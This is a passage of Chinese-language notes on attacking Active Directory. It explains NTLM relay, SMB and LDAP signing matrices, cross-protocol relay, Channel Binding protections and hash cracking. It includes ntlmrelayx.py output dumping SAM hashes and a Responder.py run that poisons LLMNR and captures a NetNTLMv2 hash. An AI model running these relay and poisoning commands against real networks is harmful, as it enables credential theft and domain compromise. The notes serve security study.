      | <-------------------- | <------------------ |  |
      |                       |                     |  | 
      |     AUTHENTICATE      |     AUTHENTICATE    |  |
      | --------------------> | ------------------> |  |
      |                       |                -----|--'
      |                       |    application      |
      |                       |     messages        |
      |                       | ------------------> |
      |                       |                     |
      |                       | <------------------ |
      |                       |                     |
      |                       | ------------------> |
      |                       |                     |
```

缺点是即便建立起连接也不知道会话密钥（在传输中加密并需要它来签名和加密信息），因此若c/s间协商好了签名，攻击者就无法生成合法的签名了，也不能与服务器会话了，即攻击失败（就是说只能一开始拦截才有用？）

即便希望协商签名，攻击者也可以篡改标志位来取消，AUTHENTICATE 的MIC就是为了防止篡改出现的，MIC的计算囊括了所有相关信息，服务器如果MIC对不上就会放弃连接

当作为一个可选项，攻击者能移除MIC并[change the flags (in the AvPairs) ](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-nlmp/83f5e789-660d-4781-8491-5f8c6641f75e)（不知道会话密钥，无法篡改MIC）

NTLMv2 为了保护MIC 把AvPairs (including the MIC flag)的值也包含在AUTHENTICATE 里计算问询回应；NTLMv1 没保护MIC所以易被攻击

（奇怪的是，在CVE-2015-005之前，如果对域帐户使用NTLM，攻击者可以使用Netlogon调用（NetrlogonSamlLogonWithFlags）要求DC验证身份验证消息并返回会话密钥，因此攻击者可以利用此来绕过签名限制。）

尽管如此，NTLM还允许用 [NTLM flag](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-nlmp/99d90ff4-957f-4c8a-80e4-5bfe5a9a9832) *NTLMSSP_NEGOTIATE_SIGN* 协商签名，c/s双方设置flag并不代表签名能使用，还需要看应用的协议；同样的，签名有三种状态：Not Supported, Supported, Required

例如，在[SMB](https://zer1t0.gitlab.io/posts/attacking_ad/#smb-shares)中包含自己的签名flag ([SecurityMode](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-smb2/e14db7ff-763a-4263-8b10-0c3944f52fc5))，决定签名是否需要，版本也会影响行为，参考 [SMB signing matrixes](https://en.hackndo.com/ntlm-relay/#signature-matrix)

SMB1 there are 3 signing states: Disabled, Enabled and Required. Required.

| **client\server** | **Required**         | **Enabled** | **Disabled**         |
| ----------------- | -------------------- | ----------- | -------------------- |
| Required          | Signed               | Signed      | Signed               |
| Enabled           | Signed (Default DCs) | Signed      | Not Signed (Default) |
| Disabled          | Signed               | Not Signed  | Not Signed           |

SMB2 中签名一直开启： Required and Not Required

| **client\server** | **Required**         | **Not Required**     |
| ----------------- | -------------------- | -------------------- |
| Required          | Signed               | Signed               |
| Not Required      | Signed (Default DCs) | Not Signed (Default) |

默认时客户端开启签名（但不必要），NTLM flag *NTLMSSP_NEGOTIATE_SIGN* 会设置；SMB2时必须设置，DC还会总是要求SMB签名，实施cross-protocol NTLM relay attack时需要考虑这一点。

[LDAP](https://zer1t0.gitlab.io/posts/attacking_ad/#ldap)也常用NTLM，三种：Required, Enabled and Disabled；与SMB不同，LDAP并没有签名flags，协商全依据*NTLMSSP_NEGOTIATE_SIGN* ，该标志在至少支持/启用LDAP时设置

| **client\server** | **Required**  | **Enabled**      | **Disabled**  |
| ----------------- | ------------- | ---------------- | ------------- |
| Required          | Signed        | Signed           | Not Supported |
| Enabled           | Signed        | Signed (Default) | Not Signed    |
| Disabled          | Not Supported | Not Signed       | Not Signed    |

（改GPOs 能改C/S的 [LDAP signing configuration](https://docs.microsoft.com/en-us/troubleshoot/windows-server/identity/enable-ldap-signing-in-windows-server)）

C/S都设置就能签名，而且**DC默认不强制LDAP签名，**因此 cross-protocol relay attack可以从LDAP到SMB2（在默认情况下）执行，但不能从SMB2到LDAP

```
###Cross-protocol NTLM Relay from SMB2 to LDAP (default case).
   client <-----SMB2----> attacker <----LDAP---> server
      |                       |                     |
      |                       |                -----|--.
      |   NEGOTIATE SIGN=1    |  NEGOTIATE SIGN=1   |  |
      | --------------------> | ------------------> |  |
      |                       |                     |  |
      |   CHALLENGE SIGN=1    |  CHALLENGE SIGN=1   |  |> NTLM Relay
      | <-------------------- | <------------------ |  |
      |                       |                     |  | 
      |  AUTHENTICATE SIGN=1  | AUTHENTICATE SIGN=1 |  |
      | --------------------> | ------------------> | -|---> MIC OK!! 
      |                       |                -----|--'
      |                       |         ||          |
      |                       |         vv          |
      |                       |    client SIGN = 1  |
      |                       |    server SIGN = 1  |
      |                       |         ||          |
      |                       |         vv          |
      |                       |   Signing required  |
      |                       |    Attack failed    |
      |                       |                     |
```

如前所述，SMB2始终设置*NTLMSSP_NEGOTIATE_SIGN*标志，因此，如果我们将此NTLM消息中继到支持签名的LDAP服务器，则签名被协商，攻击失败。请记住，NTLM消息不能被篡改，因为MIC受保护（在NTLMv2中）

LDAP转发到SMB，攻击者可以通过使用SMB头与SMB2服务器协商不需要签名，并中继LDAP NTLM消息，由于SMB中不使用签名，会话将不需要签名，攻击成功，但是，这种攻击不可能针对DC，因为DC默认需要签名

```
###Cross-protocol NTLM Relay from SMB2 to LDAP (default case).
    client <-----LDAP----> attacker <------SMB2------> server (Non DC)
      |                       |
      |     LDAP request      |                          |
      | --------------------> |                          |
      |                       |                          |
      |     LDAP response     |                          |
      | <-------------------- |                          |
      |                       |                          |
      |                       |  SMB2 NEGOTIATE REQUEST  |
      |                       | -----------------------> |
      |                       |  SMB SIGN_REQUIRED = 0   |  
      |                       |                          |
      |                       |                          |
      |                       |  SMB2 NEGOTIATE RESPONSE |
      |                       | <----------------------- |
      |                       |  SMB SIGN_REQUIRED = 0   |  
      |                       |                          |
      |                       |                     -----|--.
      |   NEGOTIATE SIGN=1    |     NEGOTIATE SIGN=1     |  |
      | --------------------> | -----------------------> |  |
      |                       |                          |  |
      |                       |                          |  |
      |   CHALLENGE SIGN=1    |     CHALLENGE SIGN=1     |  |> NTLM Relay
      | <-------------------- | <----------------------- |  |
      |                       |                          |  |
      |                       |                          |  | 
      |  AUTHENTICATE SIGN=1  |   AUTHENTICATE SIGN=1    |  |
      | --------------------> | -----------------------> | -|---> MIC OK!!
      |                       |                     -----|--'
      |                       |         ||               |
      |                       |         vv               |
      |                       | client SIGN_REQUIRED = 0 |
      |                       | server SIGN_REQUIRED = 0 |
      |                       |         ||               |
      |                       |         vv               |
      |                       |  Signing NOT required    |
      |                       |   Successful Attack!!    |
      |                       |                          |
      |                       |    application           |
      |                       |     messages             |
      |                       | -----------------------> |
      |                       |                          |
      |                       | <----------------------- |
      |                       |                          |
      |                       | -----------------------> |
      |                       |                          |
```

实际上，SMB2协议可以针对自身进行中继：

```
###SMB2 NTLM Relay (default case).
 client <------SMB2-----> attacker <------SMB2------> server (Non DC)
   |                          |                          |
   | SMB2 NEGOTIATE REQUEST   |  SMB2 NEGOTIATE REQUEST  |
   | -----------------------> | -----------------------> |
   |  SMB SIGN_REQUIRED = 0   |  SMB SIGN_REQUIRED = 0   |
   |                          |                          |
   |                          |                          |
   | SMB2 NEGOTIATE RESPONSE  |  SMB2 NEGOTIATE RESPONSE |
   | <----------------------- | <----------------------- |
   |  SMB SIGN_REQUIRED = 0   |  SMB SIGN_REQUIRED = 0   |
   |                          |                          |
   |                          |                          |
   |                          |                     -----|--.
   |   NEGOTIATE SIGN=1       |     NEGOTIATE SIGN=1     |  |
   | -------------------->    | -----------------------> |  |
   |                          |                          |  |
   |                          |                          |  |
   |   CHALLENGE SIGN=1       |     CHALLENGE SIGN=1     |  |> NTLM Relay
   | <--------------------    | <----------------------- |  |
   |                          |                          |  |
   |                          |                          |  | 
   |  AUTHENTICATE SIGN=1     |   AUTHENTICATE SIGN=1    |  |
   | -------------------->    | -----------------------> | -|---> MIC OK!!
   |                          |                     -----|--'
   |                          |           ||             |
   |                          |           vv             |
   |                          | client SIGN_REQUIRED = 0 |
   |                          | server SIGN_REQUIRED = 0 |
   |                          |           ||             |
   |                          |           vv             |
   |                          |  Signing NOT required    |
   |                          |   Successful Attack!!    |
   |                          |                          |
   |                          |       application        |
   |                          |        messages          |
   |                          | -----------------------> |
   |                          |                          |
   |                          | <----------------------- |
   |                          |                          |
   |                          | -----------------------> |
   |                          |                          |
```

```powershell
###NTLM Relay SMB2 to SMB2 with ntlmrelayx.py
$ ntlmrelayx.py -t 192.168.100.10 -smb2support --no-http-server
Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation

[*] Protocol Client HTTP loaded..
[*] Protocol Client HTTPS loaded..
[*] Protocol Client SMB loaded..
[*] Protocol Client LDAP loaded..
[*] Protocol Client LDAPS loaded..
[*] Protocol Client SMTP loaded..
[*] Protocol Client IMAP loaded..
[*] Protocol Client IMAPS loaded..
[*] Protocol Client MSSQL loaded..
/usr/lib/python3/dist-packages/requests/__init__.py:91: RequestsDependencyWarning: urllib3 (1.26.3) or chardet (3.0.4) doesn't match a supported version!
  RequestsDependencyWarning)
[*] Running in relay mode to single host
[*] Setting up SMB Server

[*] Servers started, waiting for connections
[*] SMBD-Thread-2: Connection from CONTOSO/ANAKIN@192.168.100.7 controlled, attacking target smb://192.168.100.10
[*] Authenticating against smb://192.168.100.10 as CONTOSO/ANAKIN SUCCEED
[*] Service RemoteRegistry is in stopped state
[*] Starting service RemoteRegistry
[*] Target system bootKey: 0xb471eae0e93128b9c8d5780c19ac9f1d
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:6535b87abdb112a8fc3bf92528ac01f6:::
user:1001:aad3b435b51404eeaad3b435b51404ee:57d583aa46d571502aad4bb7aea09c70:::
srvuser:1005:aad3b435b51404eeaad3b435b51404ee:38db3f2d2842051c8b7c01d56da283dd:::
[*] Done dumping SAM hashes for host: 192.168.100.10
[*] Stopping service RemoteRegistry
```

另一个可以使用NTLM的协议是HTTP，但默认情况下不使用它。因此HTTP可用于LDAP或SMB的跨协议中继攻击。

```
###Cross-protocol NTLM Relay from HTTP to LDAP.
  client <-----HTTP----> attacker <----LDAP----> server
      |                       |                      |
      |                       |                 -----|--.
      |     NEGOTIATE SIGN=0  |  NEGOTIATE SIGN=0    |  |
      | --------------------> | -------------------> |  |
      |                       |                      |  |
      |     CHALLENGE SIGN=1  |  CHALLENGE SIGN=1    |  |> NTLM Relay
      | <-------------------- | <------------------- |  |
      |                       |                      |  | 
      |  AUTHENTICATE SIGN=0  | AUTHENTICATE SIGN=0  |  |
      | --------------------> | -------------------> | -|---> MIC OK!! 
      |                       |                 -----|--'
      |                       |         ||           |
      |                       |         vv           |
      |                       |    client SIGN = 0   |
      |                       |    server SIGN = 1   |
      |                       |         ||           |
      |                       |         vv           |
      |                       | Signing NOT required |
      |                       |  Successful Attack!! |
      |                       |                      |
      |                       |    application       |
      |                       |     messages         |
      |                       | -------------------> |
      |                       |                      |
      |                       | <------------------- |
      |                       |                      |
      |                       | -------------------> |
      |                       |                      |
```

由于客户端未指定启用了签名，因此不需要LDAP签名，这种场景用来打 [PrivExchange](https://dirkjanm.io/abusing-exchange-one-api-call-away-from-domain-admin/)漏洞；中继到LDAP非常有用，因为您可以使用它来更改域数据库的ACL或对象，还可能提权

[ntlmrelayx.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/ntlmrelayx.py) or [MultiRelay.py](https://github.com/lgandx/Responder/blob/master/tools/MultiRelay.py)脚本能用来NTLM中继攻击，和 [Responder.py](https://github.com/lgandx/Responder)一起能允许实施中间人攻击。在win上还可以用 [Inveigh ](https://github.com/Kevin-Robertson/Inveigh)实施MiTM and relay，但此工具限制是不能从win机器上实施NTLM relay attack from SMB2 to SMB2 ，因为445被系统占用

除了SMB和LDAP之外，还有其他协议（如MS-SQL或SMTP）支持NTLM并可用于此攻击。

##### **NTLM Relay Protections**

跨协议NTLM中继也有防护，如**Channel Binding** or **EPA** (Enhanced Protection for Authentication)。Channel Binding 将有关应用程序协议的信息添加到由MIC保护的NTLM的AUTHENTICATE 消息中，分两种种类：**Service binding** and **TLS binding**

[Service binding](https://en.hackndo.com/ntlm-relay/#service-binding)由客户机组成，该客户机指示AUTHENTICATE 消息中AvPairs 的服务SPN （受NTLMv2散列保护）因此服务器可以检查NTLM请求是否针对它。例如，如果客户端指示NTLM请求是针对LDAP服务的，而接收该请求的服务器处理的是SMB（因为中间有攻击者），则它将拒绝身份验证。此外，SPN还指示服务器的地址，因此如果将其中继到其他服务器，则身份验证将被拒绝

[TLS binding ](https://en.hackndo.com/ntlm-relay/#tls-binding)客户端使用服务器证书的会话密钥计算用于创建TLS通道的哈希，称为CBT （Channel Binding Token）。如果有人实施MiTM 攻击，攻击者提供的证书（需要创建新证书来加解密TLS流量）会和原始服务器的不同；因此服务器会检查由客户端创建的CBT，如果和自己证书的哈希不匹配就会拒绝认证。

与签名相同，Channel Binding的应用取决于应用协议。SMB和LDAP的更新客户端应该使用Channel Binding，但是服务器似乎没有检查它。

#### **NTLM hashes cracking**

即便不能中继攻击，还是能中间人 [grab the NTLM hashes ](https://0xdf.gitlab.io/2019/01/13/getting-net-ntlm-hases-from-windows.html)然后破解，[Responder.py ](https://github.com/lgandx/Responder)or  [Inveigh](https://github.com/Kevin-Robertson/Inveigh) 都能PiTM 

```bash
###NTLM hashes capture with Responder.py
# ./Responder.py -I enp7s0
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|
[blalbalbalblablblalbalbalblablblalbalbalblablblalbalbalblablblalbalbalblabl]
[!] Error starting TCP server on port 80, check permissions or other servers running.
[+] Listening for events...
[*] [LLMNR]  Poisoned answer sent to 192.168.100.7 for name fake-pc
[*] [LLMNR]  Poisoned answer sent to 192.168.100.7 for name fake-pc
[SMB] NTLMv2-SSP Client   : 192.168.100.7
[SMB] NTLMv2-SSP Username : CONTOSO\anakin
[SMB] NTLMv2-SSP Hash     : anakin::CONTOSO:9ec132434bd81f13:77E13480A5BE1935B832EE3E698C2424:0101000.......
```

还可以 [craft malicious files ](https://www.securify.nl/blog/living-off-the-land-stealing-netntlm-hashes)来建立连接，用[ntlm_theft](https://github.com/Greenwolf/ntlm_theft)来创建文件搜集NTLM哈希

[XXE or LFI](https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/) 也能拿NTLM哈希，反弹shell

 [hashcat ](https://hashcat.net/hashcat/)爆破NTLM哈希也行。NTLM 哈希 (or Net-NTLM hashes)是使用客户端帐户的NT散列（以及AUTHENTICATE 消息中包含的公共信息）创建的，NTLMv1哈希比NTLMv2哈希破解更快，因为它们是用较弱的算法创建的